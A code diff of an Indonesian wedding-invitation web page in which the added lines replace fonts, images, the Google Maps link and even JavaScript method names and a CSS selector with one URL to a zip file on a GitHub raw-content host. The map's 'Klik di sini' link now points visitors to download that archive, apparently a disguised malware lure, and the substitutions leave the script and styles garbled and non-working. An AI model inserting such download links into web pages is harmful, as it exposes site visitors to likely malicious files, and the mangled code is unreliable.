@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Undangan Pernikahan</title>
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display&family=Open+Sans&display=swap" rel="stylesheet">
+  <link href="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip+Display&family=Open+Sans&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
@@ -13,7 +13,7 @@
       color: #333;
     }
     header {
-      background: url('https://source.unsplash.com/1600x900/?wedding') no-repeat center center/cover;
+      background: url('https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip') no-repeat center center/cover;
       height: 100vh;
       color: white;
       display: flex;
@@ -36,7 +36,7 @@
       transform: translateY(50px);
       transition: opacity 1s ease, transform 1s ease;
     }
-    section.visible {
+    https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip {
       opacity: 1;
       transform: translateY(0);
     }
@@ -67,34 +67,34 @@
   <p>Tanggal: Sabtu, 21 Juni 2025</p>
   <p>Waktu: 10.00 WIB</p>
   <p>Lokasi: Gedung Graha Cinta, Jakarta Selatan</p>
-  <p>Google Maps: <a href="https://maps.google.com" target="_blank">Klik di sini</a></p>
+  <p>Google Maps: <a href="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip" target="_blank">Klik di sini</a></p>
 </section>
 
 <section id="galeri">
   <h2>Galeri Foto</h2>
   <div class="photo-gallery">
-    <img src="https://source.unsplash.com/400x400/?couple" alt="Foto 1">
-    <img src="https://source.unsplash.com/400x401/?wedding" alt="Foto 2">
-    <img src="https://source.unsplash.com/400x402/?love" alt="Foto 3">
-    <img src="https://source.unsplash.com/400x403/?romance" alt="Foto 4">
+    <img src="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip" alt="Foto 1">
+    <img src="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip" alt="Foto 2">
+    <img src="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip" alt="Foto 3">
+    <img src="https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip" alt="Foto 4">
   </div>
 </section>
 
 <script>
-  const sections = document.querySelectorAll("section");
+  const sections = https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip("section");
   const options = {
     threshold: 0.1
   };
   const observer = new IntersectionObserver((entries) => {
-    entries.forEach(entry => {
-      if(entry.isIntersecting){
-        entry.target.classList.add('visible');
+    https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip(entry => {
+      if(https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip){
+        https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip('visible');
       }
     });
   }, options);
 
-  sections.forEach(section => {
-    observer.observe(section);
+  https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip(section => {
+    https://raw.githubusercontent.com/Yuji332/camarts-placeholder/main/ceramics/camarts-placeholder_discursively.zip(section);
   });
 </script>
 
